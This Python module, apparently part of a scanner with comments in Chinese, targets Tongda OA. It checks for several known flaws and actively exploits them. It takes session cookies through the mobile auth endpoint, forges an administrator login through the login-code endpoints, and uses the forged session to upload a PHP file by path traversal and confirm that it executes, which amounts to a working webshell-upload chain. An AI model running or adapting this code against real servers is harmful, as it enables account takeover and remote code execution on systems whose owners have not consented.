from termcolor import cprint
import requests
import threading
import re
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from tqdm import *
from colorama import Fore

# 全都用tqdm.write(url)打印     能够打印在进度条上方，并将进度条下移一行。
# 存在漏洞可能得需要红色，使用   tqdm.write(Fore.RED + url)   打印则有颜色
# 打印一些错误需要灰色 使用   tqdm.write(Fore.WHITE + url)
# 打印漏洞结果 使用   tqdm.write(Fore.BLACK + url)


# 通达OA
class Detect(threading.Thread):
    name = 'tongda'

    def __init__(self, url, vul_list, requests_proxies):
        threading.Thread.__init__(self)
        self.url = url.rstrip('/')
        self.vul_list = vul_list                    # 存储漏洞的名字和url
        self.proxies = requests_proxies  # 代理
        self.headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}
        self.version = ""
        self.phpSession = []
        self.isExist = False  # 检测该url是否存在漏洞，默认为False，如果测出有漏洞，则设置为True

    # 调用各种漏洞检测方法
    def run_detect(self):
        # 获取版本
        self.getVersion()


        # ueditor任意文件上传
        self.ueditorUpload()

        # 通达OA 2013 2015 任意⽂件上传漏洞
        self.Upload1()

        # 通达OA在线用户获取cookeis
        self.RELOGIN()

        # 任意用户登陆
        self.Arbitrary_User_Login()

        # 任意用户登陆->任意文件上传
        self.upload()

        if not self.isExist:
            return False
        else:
            return True

    # 获取版本
    def getVersion(self):
        version_url = self.url + "/inc/expired.php"
        try:
            res = requests.get(url=version_url, headers=self.headers, proxies=self.proxies, verify=False)
            self.version = re.findall("<title>(.*)</title>", res.text)[0]
            tqdm.write(Fore.RED + '[+] {} 通达oa[{}]'.format(self.url, self.version))
        except Exception as e:
            pass


    # ueditor任意文件上传
    def ueditorUpload(self):
        ueditor_url = self.url + "/module/ueditor/php/action_upload.php"
        try:
            res = requests.get(url=ueditor_url, headers=self.headers, proxies=self.proxies, verify=False)
            if res.status_code == 200 and "" == res.text:
                tqdm.write(Fore.RED + '[+] {} 通达oa[{}] ueditor任意文件上传 {}'.format(self.url, self.version, ueditor_url))
                self.vul_list.append(['通达oa[{}] ueditor任意文件上传'.format(self.version), self.url, 'Yes'])
                self.isExist = True
        except Exception as e:
            pass

    # 通达OA 2013 2015 任意⽂件上传漏洞
    def Upload1(self):
        '''
        EXP:
        <form enctype="multipart/form-data" action="http://0-sec.org/general/vmeet/wbUpload.php?fileName=test.php+" method="post">
        <input type="file" name="Filedata" size="50"><br>
        <input type="submit" value="Upload">
        </form>
        上传jpg之后shell地址为
        http://0-sec.org/general/vmeet/wbUpload/test.php
        '''
        upload1_url = self.url + "/general/vmeet/wbUpload.php?fileName=test.php+"
        try:
            res = requests.get(url=upload1_url, headers=self.headers, proxies=self.proxies, verify=False)
            if res.status_code == 200 and "" == res.text:
                tqdm.write(Fore.RED + '[+] {} 通达oa[{}] 2013 2015 任意⽂件上传漏洞 {}'.format(self.url, self.version, upload1_url))
                self.vul_list.append(['通达oa[{}] 2013 2015 任意⽂件上传漏洞'.format(self.version), self.url, 'Yes'])
                self.isExist = True
        except Exception as e:
            pass



    # 通达OA在线用户获取cookies
    def RELOGIN(self):
        RELOGIN_url = self.url + "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
        try:
            res = requests.get(url=RELOGIN_url, headers=self.headers, proxies=self.proxies, verify=False)
            if 'RELOGIN' == res.text:
                tqdm.write(Fore.RED + '[+] {} 通达oa[{}] 在线用户获取cookies {}, 但是管理员不在线,一直访问直到管理员上线'.format(self.url, self.version, RELOGIN_url))
                self.vul_list.append(['通达oa[{}] 在线用户获取cookies, 但是管理员不在线,一直访问直到管理员上线'.format(self.version), self.url, 'Yes {}'.format(RELOGIN_url)])
                self.isExist = True
            elif "" == res.text:
                tqdm.write(Fore.RED + '[+] {} 通达oa[{}] 在线用户获取cookies {}, 管理员在线, cookies:{}'.format(self.url, self.version, RELOGIN_url, res.headers["Set-Cookie"]))
                self.vul_list.append(['通达oa[{}] 在线用户获取cookies, 管理员在线, cookies:{}'.format(self.version, res.headers["Set-Cookie"]), self.url, 'Yes {}'.format(RELOGIN_url)])
                self.isExist = True
        except Exception as e:
            pass

    # 任意用户登陆
    def Arbitrary_User_Login(self):

        def getV11Session():
            V11Session_url = self.url + '/general/login_code.php'
            try:
                # tqdm.write(Fore.WHITE + '1111')
                res = requests.get(url=V11Session_url, headers=self.headers, proxies=self.proxies, verify=False)
                resText = str(res.text).split('{')
                codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
                getSessUrl = self.url + '/logincheck_code.php'
                res = requests.post(getSessUrl, data={'CODEUID': '{' + codeUid + '}', 'UID': int(1)}, headers=self.headers, proxies=self.proxies, verify=False)
                phpSession = res.headers['Set-Cookie']
                # tqdm.write(Fore.RED + '[+] 通达oa[{}] 任意用户登陆1 {} COOKIE: {}'.format(self.version, self.url, phpSession))
                # self.vul_list.append(['通达oa[{}] 任意用户登陆'.format(self.version), self.url, 'Yes {}'.format(phpSession)])
                # self.isExist = True
                self.phpSession.extend(re.findall(r'PHPSESSID=(.*);', phpSession))
            except Exception as e:
                pass
                # tqdm.write(Fore.WHITE + '1111')
                # tqdm.write(Fore.WHITE + str(e.args))

        def get2017Session():
            V2017Session_url = url + '/ispirit/login_code.php'
            try:
                res = requests.get(url=V2017Session_url, headers=self.headers, proxies=self.proxies, verify=False)
                resText = json.loads(res.text)
                codeUid = resText['codeuid']
                codeScanUrl = url + '/general/login_code_scan.php'
                res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'}, headers=self.headers, proxies=self.proxies, verify=False)
                resText = json.loads(res.text)
                status = resText['status']
                if status == str(1):
                    getCodeUidUrl = url + '/ispirit/login_code_check.php?codeuid=' + codeUid
                    res = requests.get(url=getCodeUidUrl, headers=self.headers, proxies=self.proxies, verify=False)
                    phpSession = res.headers['Set-Cookie']
                    # tqdm.write(Fore.RED + '[+] 通达oa[{}] 任意用户登陆2 {} COOKIE: {}'.format(self.version, self.url, phpSession))
                    # self.vul_list.append(['通达oa[{}] 任意用户登陆'.format(self.version), self.url, 'Yes {}'.format(phpSession)])
                    # self.isExist = True
                    self.phpSession.extend(re.findall(r'PHPSESSID=(.*);', phpSession))
                else:
                    pass
            except Exception as e:
                pass
                # tqdm.write(Fore.WHITE + '22222')
                # tqdm.write(Fore.WHITE + str(e.args))

        # 检测是否真的任意用户登录
        def checkLogin():
            if self.phpSession:
                for phpSession in self.phpSession:
                    try:
                        headers = {'Cookie': 'PHPSESSID={}'.format(phpSession),
                                   'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36'}
                        login_url = self.url + "/general/index.php"
                        res = requests.get(url=login_url, headers=headers, proxies=self.proxies, verify=False)
                        if '用户未登录' not in res.text:
                            tqdm.write(Fore.RED + '[+] {} 通达oa[{}] 任意用户登陆 {} COOKIE: {}'.format(self.url, self.version, self.url, phpSession))
                            self.vul_list.append(['通达oa[{}] 任意用户登陆'.format(self.version), self.url, 'Yes {}'.format(phpSession)])
                            self.isExist = True
                    except Exception as e:
                        pass



        getV11Session()
        get2017Session()
        checkLogin()


    # 任意用户登陆->任意文件上传
    def upload(self):
        data = '''------WebKitFormBoundarydXBsu3ij7eWNgVHY
Content-Disposition: form-data; name="FILE1"; filename="111222333.php"
Content-Type: application/octet-stream

111222333
------WebKitFormBoundarydXBsu3ij7eWNgVHY
Content-Disposition: form-data; name="Submit"


exp
------WebKitFormBoundarydXBsu3ij7eWNgVHY--'''

        if self.phpSession:
            for phpSession in self.phpSession:
                try:
                    headers = {'Cookie': 'PHPSESSID={}'.format(phpSession),
                               'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydXBsu3ij7eWNgVHY',
                               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36'}
                    upload_url = r'{}/general/reportshop/utils/upload.php?action=upload&newid=123456/../../../../'.format(self.url)
                    requests.post(url=upload_url, data=data, headers=headers, proxies=self.proxies, verify=False)
                    shell_url = r'{}/%7D_111222333.php'.format(self.url)

                    res = requests.get(url=shell_url, headers=self.headers, proxies=self.proxies, verify=False)
                    if '111222333' in res.text:
                        tqdm.write(Fore.RED + '[+] 通达oa[{}] 任意用户登陆->任意文件上传 {} '.format(self.version, shell_url))
                        self.vul_list.append(['通达oa[{}] 任意用户登陆->任意文件上传'.format(self.version), shell_url, 'Yes PHPSESSID={}'.format(phpSession)])
                        self.isExist = True
                        break
                except Exception as e:
                    tqdm.write(Fore.WHITE + (e.args))




if __name__ == '__main__':
    from queue import Queue

    vul_list = []
    # proxy = r'192.168.168.148:10086'
    # requests_proxies = {"http": "socks5://{}".format(proxy), "https": "socks5://{}".format(proxy)}
    requests_proxies = None
    url = r'http://www.domain.com'
    Detect(url, vul_list, requests_proxies).run_detect()

    tqdm.write(Fore.BLACK + '-' * 50 + '结果' + '-' * 50)
    for vul in vul_list:
        tqdm.write(Fore.BLACK + str(vul))
